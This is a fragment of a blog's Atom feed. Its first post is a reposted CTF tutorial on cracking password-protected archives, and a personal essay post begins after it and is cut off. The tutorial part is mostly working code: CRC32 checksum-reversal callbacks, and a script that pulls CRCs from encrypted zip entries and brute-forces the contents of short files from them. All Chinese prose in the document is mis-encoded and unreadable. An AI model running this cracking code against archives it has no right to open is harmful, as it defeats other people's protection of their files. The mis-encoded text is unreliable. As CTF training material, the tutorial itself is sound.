class="string">'calc'</span>, parents=[</span><br><span class="line">        outfile_parser,</span><br><span class="line">        poly_flip_parser,</span><br><span class="line">        default_accum_parser,</span><br><span class="line">        default_poly_parser,</span><br><span class="line">        infile_parser],</span><br><span class="line">        help=<span class="string">"calculate the CRC32 checksum"</span>)</span><br><span class="line">    subparser.set_defaults(func=calc_callback)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reciprocal_callback</span><span class="params">()</span>:</span></span><br><span class="line">    poly = parse_dword(args.poly)</span><br><span class="line">    check32(poly)</span><br><span class="line">    print_num(reciprocal(poly))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_callback</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># initialize tables</span></span><br><span class="line">    init_tables(get_poly(), <span class="keyword">False</span>)</span><br><span class="line">    <span class="comment"># print table</span></span><br><span class="line">    out(<span class="string">'[&#123;0&#125;]'</span>.format(<span class="string">', '</span>.join(map(<span class="string">'0x&#123;0:08x&#125;'</span>.format, table))))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_callback</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># initialize tables</span></span><br><span class="line">    init_tables(get_poly())</span><br><span class="line">    <span class="comment"># find reverse bytes</span></span><br><span class="line">    desired = parse_dword(args.desired)</span><br><span class="line">    accum = parse_dword(args.accum)</span><br><span class="line">    <span class="comment"># 4-byte patch</span></span><br><span class="line">    patches = findReverse(desired, accum)</span><br><span class="line">    <span class="keyword">for</span> patch <span class="keyword">in</span> patches:</span><br><span class="line">        out(<span class="string">'4 bytes: &#123;&#123;0x&#123;0:02x&#125;, 0x&#123;1:02x&#125;, 0x&#123;2:02x&#125;, 0x&#123;3:02x&#125;&#125;&#125;'</span>.format(*patch))</span><br><span class="line">        checksum = calc(patch, accum)</span><br><span class="line">        out(<span class="string">'verification checksum: 0x&#123;0:08x&#125; (&#123;1&#125;)'</span>.format(</span><br><span class="line">            checksum, <span class="string">'OK'</span> <span class="keyword">if</span> checksum == desired <span class="keyword">else</span> <span class="string">'ERROR'</span>))</span><br><span class="line">    <span class="comment"># 6-byte alphanumeric patches</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permitted_characters:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> permitted_characters:</span><br><span class="line">            patch = [i, j]</span><br><span class="line">            patches = findReverse(desired, calc(patch, accum))</span><br><span class="line">            <span class="keyword">for</span> last_4_bytes <span class="keyword">in</span> patches:</span><br><span class="line">                <span class="keyword">if</span> all(p <span class="keyword">in</span> permitted_characters <span class="keyword">for</span> p <span class="keyword">in</span> last_4_bytes):</span><br><span class="line">                    patch.extend(last_4_bytes)</span><br><span class="line">                    out(<span class="string">'alternative: &#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;5&#125;&#123;6&#125; (&#123;0&#125;)'</span>.format(</span><br><span class="line">                        <span class="string">'OK'</span> <span class="keyword">if</span> calc(patch, accum) == desired <span class="keyword">else</span> <span class="string">'ERROR'</span>, *map(chr, patch)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_callback</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># initialize tables</span></span><br><span class="line">    init_tables(get_poly())</span><br><span class="line">    <span class="comment"># calculate checksum</span></span><br><span class="line">    accum = parse_dword(args.accum)</span><br><span class="line">    maxlen = int(args.len, <span class="number">0</span>)</span><br><span class="line">    data = get_input()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; maxlen &lt;= len(data):</span><br><span class="line">        maxlen = len(data)</span><br><span class="line">    out(<span class="string">'rewinded &#123;0&#125;/&#123;1&#125; (&#123;2:.2f&#125;%)'</span>.format(maxlen, len(data),</span><br><span class="line">        maxlen * <span class="number">100.0</span> / len(data) <span class="keyword">if</span> len(data) <span class="keyword">else</span> <span class="number">100</span>))</span><br><span class="line">    <span class="keyword">for</span> solution <span class="keyword">in</span> rewind(accum, data[-maxlen:]):</span><br><span class="line">        out(<span class="string">''</span>)</span><br><span class="line">        print_num(solution)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_callback</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># initialize tables</span></span><br><span class="line">    init_tables(get_poly(), <span class="keyword">False</span>)</span><br><span class="line">    <span class="comment"># calculate checksum</span></span><br><span class="line">    accum = parse_dword(args.accum)</span><br><span class="line">    data = get_input()</span><br><span class="line">    out(<span class="string">'data len: &#123;0&#125;'</span>.format(len(data)))</span><br><span class="line">    out(<span class="string">''</span>)</span><br><span class="line">    print_num(calc(data, accum))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv=None)</span>:</span></span><br><span class="line">    <span class="string">''' Runs the program and handles command line options '''</span></span><br><span class="line">    parser = get_parser()</span><br><span class="line">    <span class="comment"># Parse arguments and run the function</span></span><br><span class="line">    <span class="keyword">global</span> args</span><br><span class="line">    args = parser.parse_args(argv)</span><br><span class="line">    args.func()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()  <span class="comment"># pragma: no cover</span></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><p><img src="/posts/rar-attack/9.png" alt=""></p><p>å½“å­—èŠ‚æ•°å°äº6æ—¶ï¼Œç”¨ä¸‹é¢çš„crack.pyè„šæœ¬ï¼ˆç”¨python3ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">'file'</span>, nargs=<span class="string">'*'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--hex'</span>, action=<span class="string">'append'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--dec'</span>, action=<span class="string">'append'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--limit'</span>, type=int)</span><br><span class="line">parser.add_argument(<span class="string">'--compiler'</span>, default=<span class="string">'g++'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--alphabet'</span>, type=os.fsencode, default=string.printable.encode())</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">targets = collections.OrderedDict()</span><br><span class="line">limit = <span class="number">0</span></span><br><span class="line">crcs = []</span><br><span class="line"><span class="keyword">if</span> args.limit:</span><br><span class="line">    limit = max(limit, args.limit)</span><br><span class="line"><span class="keyword">if</span> args.hex <span class="keyword">or</span> args.dec:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.limit:</span><br><span class="line">        parser.error(<span class="string">'Limit of length not specified'</span>)</span><br><span class="line"><span class="keyword">if</span> args.hex:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> args.hex:</span><br><span class="line">        crc = int(s, <span class="number">16</span>)</span><br><span class="line">        targets[s] = crc</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(args.limit + <span class="number">1</span>):</span><br><span class="line">            crcs += [( crc, l )]</span><br><span class="line"><span class="keyword">if</span> args.dec:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> args.dec:</span><br><span class="line">        crc = int(s)</span><br><span class="line">        targets[s] = crc</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(args.limit + <span class="number">1</span>):</span><br><span class="line">            crcs += [( crc, l )]</span><br><span class="line"><span class="keyword">if</span> args.file:</span><br><span class="line">    print(<span class="string">'reading zip files...'</span>, file=sys.stderr)</span><br><span class="line">    <span class="keyword">import</span> zipfile</span><br><span class="line">    <span class="keyword">for</span> zipname <span class="keyword">in</span> args.file:</span><br><span class="line">        fh = zipfile.ZipFile(zipname)</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> fh.infolist():</span><br><span class="line">            targets[<span class="string">'%s / %s'</span> % ( zipname, info.filename )] = ( info.CRC, info.file_size )</span><br><span class="line">            crcs += [( info.CRC, info.file_size )]</span><br><span class="line">            limit = max(limit, info.file_size)</span><br><span class="line">            print(<span class="string">'file found: %s / %s: crc = 0x%08x, size = %d'</span> % (zipname, info.filename, info.CRC, info.file_size), file=sys.stderr)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> crcs:</span><br><span class="line">    parser.error(<span class="string">'No CRCs given'</span>)</span><br><span class="line"><span class="comment"># compiling c++ in python script is the easy way to have the both a good interface and better speed</span></span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">code += <span class="string">r'''</span></span><br><span class="line"><span class="string">#include &lt;cstdio&gt;</span></span><br><span class="line"><span class="string">#include &lt;vector&gt;</span></span><br><span class="line"><span class="string">#include &lt;array&gt;</span></span><br><span class="line"><span class="string">#include &lt;string&gt;</span></span><br><span class="line"><span class="string">#include &lt;set&gt;</span></span><br><span class="line"><span class="string">#include &lt;cstdint&gt;</span></span><br><span class="line"><span class="string">#include &lt;cctype&gt;</span></span><br><span class="line"><span class="string">#define repeat(i,n) for (int i = 0; (i) &lt; (n); ++(i))</span></span><br><span class="line"><span class="string">using namespace std;</span></span><br><span class="line"><span class="string">uint32_t crc_table[256];</span></span><br><span class="line"><span class="string">void make_crc_table() &#123;</span></span><br><span class="line"><span class="string">    repeat (i, 256) &#123;</span></span><br><span class="line"><span class="string">        uint32_t c = i;</span></span><br><span class="line"><span class="string">        repeat (j, 8) &#123;</span></span><br><span class="line"><span class="string">            c = (c &amp; 1) ? (0xedb88320 ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        crc_table[i] = c;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">const uint32_t initial_crc32 = 0xffffffff;</span></span><br><span class="line"><span class="string">uint32_t next_crc32(uint32_t c, char b) &#123;</span></span><br><span class="line"><span class="string">    return crc_table[(c ^ b) &amp; 0xff] ^ (c &gt;&gt; 8);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">const uint32_t mask_crc32 = 0xffffffff;</span></span><br><span class="line"><span class="string">const char alphabet[] = &#123; '''</span> + <span class="string">', '</span>.join(map(str, args.alphabet)) + <span class="string">r''' &#125;;</span></span><br><span class="line"><span class="string">const int limit = '''</span> + str(limit) + <span class="string">r''';</span></span><br><span class="line"><span class="string">array&lt;set&lt;uint32_t&gt;, limit+1&gt; crcs;</span></span><br><span class="line"><span class="string">string stk;</span></span><br><span class="line"><span class="string">void dfs(uint32_t crc) &#123;</span></span><br><span class="line"><span class="string">    if (crcs[stk.length()].count(crc ^ mask_crc32)) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr, "crc found: 0x%08x: \"", crc ^ mask_crc32);</span></span><br><span class="line"><span class="string">        for (char c : stk) fprintf(stderr, isprint(c) &amp;&amp; (c != '\\') ? "%c" : "\\x%02x", c);</span></span><br><span class="line"><span class="string">        fprintf(stderr, "\"\n");</span></span><br><span class="line"><span class="string">        printf("%08x ", crc ^ mask_crc32);</span></span><br><span class="line"><span class="string">        for (char c : stk) printf(" %02x", c);</span></span><br><span class="line"><span class="string">        printf("\n");</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (stk.length() &lt; limit) &#123;</span></span><br><span class="line"><span class="string">        for (char c : alphabet) &#123;</span></span><br><span class="line"><span class="string">            stk.push_back(c);</span></span><br><span class="line"><span class="string">            dfs(next_crc32(crc, c));</span></span><br><span class="line"><span class="string">            stk.pop_back();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> crc, size <span class="keyword">in</span> crcs:</span><br><span class="line">    code += <span class="string">'    crcs['</span> + str(size) + <span class="string">'].insert('</span> + hex(crc) + <span class="string">');\n'</span></span><br><span class="line">code += <span class="string">r'''</span></span><br><span class="line"><span class="string">    make_crc_table();</span></span><br><span class="line"><span class="string">    dfs(initial_crc32);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> tmpdir:</span><br><span class="line">    cppname = os.path.join(tmpdir, <span class="string">'a.cpp'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(cppname, <span class="string">'w'</span>) <span class="keyword">as</span> fh:</span><br><span class="line">        fh.write(code)</span><br><span class="line">    binname = os.path.join(tmpdir, <span class="string">'a.out'</span>)</span><br><span class="line">    print(<span class="string">'compiling...'</span>, file=sys.stderr)</span><br><span class="line">    p = subprocess.check_call([args.compiler, <span class="string">'-std=c++11'</span>, <span class="string">'-O3'</span>, <span class="string">'-o'</span>, binname, cppname])</span><br><span class="line">    print(<span class="string">'searching...'</span>, file=sys.stderr)</span><br><span class="line">    p = subprocess.Popen([binname], stdout=subprocess.PIPE)</span><br><span class="line">    output, _ = p.communicate()</span><br><span class="line">print(<span class="string">'done'</span>, file=sys.stderr)</span><br><span class="line">print(file=sys.stderr)</span><br><span class="line">result = collections.defaultdict(list)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> output.decode().strip().split(<span class="string">'\n'</span>):</span><br><span class="line">    crc, *val = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), line.split())</span><br><span class="line">    result[( crc, len(val) )] += [ bytes(val) ]</span><br><span class="line"><span class="keyword">for</span> key, crc <span class="keyword">in</span> targets.items():</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> result[crc]:</span><br><span class="line">        print(<span class="string">'%s : %s'</span> % (key, repr(s)[<span class="number">1</span>:]))</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><p><img src="/posts/rar-attack/10.png" alt=""></p><h2 id="0x06-MORE"><a href="#0x06-MORE" class="headerlink" title="0x06 MORE"></a>0x06 MORE</h2><p>è¿˜æœ‰å¾ˆå¤šå‹ç¼©åŒ…çš„å¯†ç éœ€è¦è”ç³»é¢˜ä¸­çš„å…¶ä»–æ–‡ä»¶æ¥è§£ï¼Œè¿™ä¸ªå°±ä¸åœ¨æœ¬ç¯‡çš„è®¨è®ºèŒƒå›´å†…äº†ï¼Œæ•…ä¸å†è®¨è®ºã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;çº¯è½¬è½½ã€‚åŸå¸–æˆ³è¿™é‡Œï¼š&lt;a href=&quot;http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;veritas501 - ç»™ä½ å‹ç¼©åŒ…å´ä¸ç»™ä½ å¯†ç çš„äººåˆ°åº•åœ¨æƒ³ä»€ä¹ˆ&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://cyris.pen.moe/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://cyris.pen.moe/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>è§‰å¾—ç†æ€§çš„äººå¿«ä¹å—</title>
    <link href="https://cyris.pen.moe/posts/the-seed/"/>
    <id>https://cyris.pen.moe/posts/the-seed/</id>
    <published>2017-07-12T12:34:52.000Z</published>
    <updated>2018-04-21T00:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>åªæ˜¯ä½ ä¸çŸ¥é“æˆ‘çš„ç‹‚é‡ã€‚</p><a id="more"></a>     <h2 id="ä¸€ã€é åœ¨çª—å¤–çš„äºº-è¯»ç€çª—è¾¹çš„æ™¯"><a href="#ä¸€ã€é åœ¨çª—å¤–çš„äºº-è¯»ç€çª—è¾¹çš„æ™¯" class="headerlink" title="ä¸€ã€é åœ¨çª—å¤–çš„äºº è¯»ç€çª—è¾¹çš„æ™¯"></a>ä¸€ã€é åœ¨çª—å¤–çš„äºº è¯»ç€çª—è¾¹çš„æ™¯</h2><p>åˆä¸­é«˜ä¸­çš„æ—¶å€™ç»å¸¸ä¼šåœ¨ç©ºé—´æˆ–è€…æœ‹å‹åœˆå‘äº›ç®€çŸ­çš„è¯ï¼Œè¯¸å¦‚â€œä¸æ˜¯é›ªæ™šäº†ï¼Œåªæ˜¯å¹´æ—©äº†ï¼ˆè®°æŸæ¬¡ç»ˆäºåˆ°æ¥çš„é›ªï¼Œå¾ˆå…´å¥‹ï¼Œçœ‹äº†ä»¥å¾€çš„æ—¥å†æ‰å‘ç°ï¼Œæ˜¯é‚£å¹´å¹´è¿‡å¾—æ—©ï¼Œæ‰€ä»¥æ‰æœ‰é›ªæ¥å¾—è¿Ÿçš„æ„Ÿå—ï¼‰â€ï¼Œâ€œæŠŠä¹¦å¤¹åœ¨å…‰é‡Œï¼ˆç¬¬ä¸€æ¬¡è§åˆ°é‚£ç§å¤¹å­å¼çš„ç§»åŠ¨å°ç¯çš„æ—¶å€™ï¼ŒæŠŠå®ƒå¤¹åœ¨äº†ç¡¬çš®ä¹¦ä¸Šç„¶åé åœ¨åºŠå‰é˜…è¯»ï¼‰â€ï¼Œç±»ä¼¼çš„è¿˜æœ‰å¾ˆå¤šï¼Œä¼¼ä¹å˜æˆäº†åŠ¨æ€åœˆçš„ä¸€è‚¡æ¸…æµï¼Œä¹Ÿä¸æ±‚å¤šå°‘èµï¼Œä¸æƒ³å¤šå°‘è¯„è®ºï¼Œåªæ˜¯æƒ³è¯´ï¼Œå°±è¯´äº†ã€‚ï¼ˆé‚£æ—¶å€™ä¹Ÿä¸ä¼šæƒ³åˆ°è¿™äº›è¯ä¼šæˆä¸ºæ°´æ¯å–œæ¬¢è‡ªå·±çš„ä¸€éƒ¨åˆ†ç†ç”±ï¼‰ã€‚ç°åœ¨å¾ˆå°‘å‘æœ‹å‹åœˆä¹‹ç±»çš„ï¼Œä¸»è¦æ˜¯å¤šäº†äº›å¯ä»¥è¯´è¯çš„äººå§ï¼Œè¡¨è¾¾çš„å¯¹è±¡ä¸åœ°æ–¹éƒ½å‘ç”Ÿäº†äº›æ”¹å˜ã€‚å½“ç„¶ä¸åŒçš„äººä¼šé‡‡å–ä¸åŒçš„è¡¨è¾¾æ–¹å¼ï¼Œæ‰€ä»¥è¡ç”Ÿå‡ºäº†å„ç§å„æ ·çš„åœˆå­ï¼Œè¿‡å¾—å¼€å¿ƒå³å¯ã€‚      </p><p><img src="/posts/the-seed/1.png" alt="">  </p><p>æ¯ä¸ªé˜¶æ®µçš„â€œå›å®¶â€éƒ½æ˜¯æœ‰ä¸åŒçš„æ„ä¹‰çš„ã€‚    </p><p>å…¶å®ä¸€ç›´å¾ˆç¾¡æ…•æœ‰å¼Ÿå¼Ÿå¦¹å¦¹çš„äººï¼Œå¤§æ¦‚æ˜¯â€œç‹¬ç”Ÿâ€å¸¦æ¥çš„æŸç§ç¨‹åº¦çš„å­¤ç‹¬æ„Ÿå¤ªè¿‡çœŸå®äº†å§ã€‚äºæ˜¯å¯ä»¥è¯´è¯çš„â€œäººâ€ï¼Œä»å°æ—¶å€™çš„ç©å…·ï¼Œåˆ°æ¸¸æˆé‡Œçš„ç†Ÿäººï¼Œåˆ°çª—å¤–çš„å¤©ç©ºï¼Œäº‘ä¸å¤ªé˜³ï¼Œåˆ°æ›¾ç»è§‰å¾—ä¼šåˆä¸æ¥ç°åœ¨å´æ— è¯ä¸è¯´çš„æŒšå‹ï¼Œåˆ°æ°´æ¯ç²ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½æœ‰ç‹¬åˆ°çš„æ•…äº‹åœ¨ã€‚    </p><p>è¿™é‡Œæ²¡æœ‰æåˆ°çˆ¶æ¯æˆ–è€…å„ç±»é•¿è¾ˆï¼Œä¸æ¸…æ¥šå…¶ä»–å®¶çš„æƒ…å†µæ‰€ä»¥ä¸ä½œå¤§ä½“çš„è¯„ä»·ï¼Œä¸è¿‡å¯¹äºæˆ‘è‡ªå·±ï¼Œå…¶å®åœ¨ç‰©è´¨å¾—åˆ°ä¸€å®šçš„æ»¡è¶³ä¹‹åï¼Œä¼šè½¬è€Œè¿½æ±‚ä¸€äº›ç²¾ç¥ä¸Šçš„ä¸œè¥¿ï¼Œè€Œè¿™äº›æ˜¯æ›´åå‘ç‰©è´¨è¿½æ±‚çš„é‚£ä¸€ä»£å¾ˆéš¾ç»™äºˆçš„ï¼Œä»–ä»¬ä¼šä»¥ç»éªŒï¼Œä»¥è‡ªå·±çš„æƒ³æ³•å‘Šè¯‰ä½ ï¼Œåº”è¯¥æ€ä¹ˆå»åšï¼Œå®¶é•¿ï¼Œå­©å­ï¼Œç”·äººï¼Œå¥³äººï¼Œè¿™äº›çš„åŒºåˆ«åœ¨ä»–ä»¬çš„çœ¼é‡Œæœ‰æ—¶å€™å¤ªè¿‡å¼ºçƒˆäº†ï¼Œä»¥è‡´äºä½ åšäº†ä¸€ä»¶ä½ æƒ³åšçš„äº‹å¯èƒ½ä¼šè¢«è¯´ï¼Œä½ ä¸èƒ½è¿™ä¹ˆåšï¼Œä½ æ˜¯ç”·å­©å­æ‰€ä»¥è¦å¼ºç¡¬ä¸èƒ½æŸ”è½¯ï¼Œä½ æ˜¯å¥³å­©å­æ‰€ä»¥ä¸è¦ç»å¸¸å‡ºå»ç©ï¼Œä½ æ˜¯å°å­©ä¸è¦å¬æˆ‘ä»¬è®²è¯ï¼Œä¸è¦ç®¡å¤§äººçš„äº‹ï¼Œä¸“å¿ƒè¯»ä¹¦å°±å¥½ï¼Œä¹‹ç±»ï¼Œ<del>ï¼ˆè¿™æ ·çœ‹æ¥å¥³è£…åè€Œæ˜¯ä¸€ç§æ€æƒ³çš„è§£æ”¾å‘¢hhï¼‰</del>å°±æ¯”å¦‚ä¸ç®¡å¤§äººçš„äº‹ï¼Œå…¶å®å­©å­å¾ˆèªæ˜ï¼Œå­¦è¯­è¨€çš„é€Ÿåº¦å°±æ¯”å¤§äººå¿«ä¸Šå¾ˆå¤šï¼Œè¿™æ ·çš„å­¦ä¹ èƒ½åŠ›ï¼Œä»¥â€œå¤§äººçš„äº‹â€æ¥é™åˆ¶ä¸€äº›æ€æƒ³çš„å¼€æ‹“ï¼Œå…¶å®è§‰å¾—æŒºå¯æƒœçš„ï¼ˆä¹Ÿç®—æ˜¯ä¹‹åå¾ˆé•¿ä¸€æ®µæ—¶é—´ä¸å¤ªçˆ±å’Œä»–ä»¬è¯´è¯çš„åŸå› å§ï¼‰ã€‚     </p><p>ä»¥å‰ä¼šè§‰å¾—ä¸èˆ’æœï¼Œä¼šé—¹è„¾æ°”ï¼Œéšæ„å¾—ä¸ç†ä»–ä»¬ï¼Œä¸€æ˜¯ç¡®å®ä¸å–œæ¬¢ä¸€äº›åšæ³•å’Œè¯´æ³•ï¼ŒäºŒæ˜¯å‰ä¸€æ®µæ—¶é—´æ‰æƒ³åˆ°çš„ï¼Œå¯èƒ½è§‰å¾—æ— è®ºè‡ªå·±æ€ä¹ˆè€æ€§å­ä»–ä»¬éƒ½ä¸ä¼šç¦»å¼€è‡ªå·±ä¸¢ä¸‹è‡ªå·±ï¼Œæ‰€ä»¥æ½œæ„è¯†é‡ŒåŠ©é•¿äº†ä¸€äº›ä»»æ€§å‘¢ã€‚å¥½åœ¨è‡ªå·±ä¹Ÿæ˜¯ä¸ªæ¯”è¾ƒå¹³é™çš„äººï¼Œä¸ä¼šå¤ªè¿‡ç”Ÿæ°”ï¼Œä¸ä¼šå¤ªè¿‡ä»»æ€§ï¼Œå³ä½¿å¶å°”æœ‰äº›æ„è§çš„äº‰æ‰§ï¼Œä¸æ˜¯æ— æ„ä¹‰çš„å¤§åµå¤§é—¹å°±å¯ä»¥æ¥å—ã€‚ä»¥åŠï¼Œä»–ä»¬ç¡®å®æ˜¯çˆ±ç€è‡ªå·±å…³å¿ƒç€è‡ªå·±çš„ â€”â€” ä»¥ä»–ä»¬è‡ªå·±çš„æ–¹å¼ã€‚è™½ç„¶ä½œä¸ºä¸€ä¸ªä¸ªä½“ï¼Œæˆ‘ä»¬æ‹¥æœ‰ç®¡ç†è‡ªå·±çš„æƒ…ç»ªå’Œé‡Šæ”¾è‡ªå·±å±æ€§çš„æƒåˆ© â€”â€” åªæ˜¯åˆé€‚ä¸åˆé€‚çš„é—®é¢˜ã€‚æ¯”è¾ƒâ€œå¦¥å–„â€çš„é‡Šæ”¾ï¼Œä¸ä»…å¯ä»¥æœ€å¤§é™åº¦åœ°è§£å‹ï¼Œä¹Ÿæ˜¯ä¸€ç§æˆç†Ÿçš„ä½“ç°å§ã€‚å­¦ä¼šæ§åˆ¶æ˜¯é—¨è‰ºæœ¯ï¼Œå®ƒä¸æ˜¯å¯¹è‡ªå·±çš„å‹æŠ‘ï¼Œåè€Œæ˜¯ç§å¼•å¯¼å¼çš„å¢ç›Šã€‚ å¯¹è‡ªå·±ä¹Ÿå¥½ï¼Œå¯¹å…¶ä»–å…³å¿ƒç”šè‡³çˆ±ç€è‡ªå·±çš„äººä¹Ÿå¥½ã€‚        </p><p>é åœ¨çª—å¤–çš„äººï¼Œè¯»ç€çª—è¾¹çš„æ™¯ã€‚  </p><p><img src="/posts/the-seed/2.png" alt=""></p><p>æ¬åˆ°æ–°å®¶ä»¥åï¼Œä¼šç»å¸¸é åœ¨å®¢å…çš„çª—è¾¹çœ‹ç€çª—å¤–çš„å¤©ã€‚æ²¡æœ‰ä»»ä½•å»ºç­‘çš„é®æŒ¡ï¼Œè§†é‡è·å¾—äº†æœ€å¤§ç¨‹åº¦çš„è‡ªç”±ã€‚ä¼šè§‰å¾—ç¦»å¤©ç©ºå¾ˆè¿‘ï¼Œç¦»å¤ªé˜³å¾ˆè¿‘ï¼Œç¦»é£å¾ˆè¿‘ï¼Œç¦»äº‘å¾ˆè¿‘ï¼Œç¦»é£é¸Ÿå¾ˆè¿‘ï¼Œç¦»ç”Ÿå‘½å¾ˆè¿‘ã€‚ä»–ä»¬æ¯å¤©èµ°ç€ä¸ä¸€æ 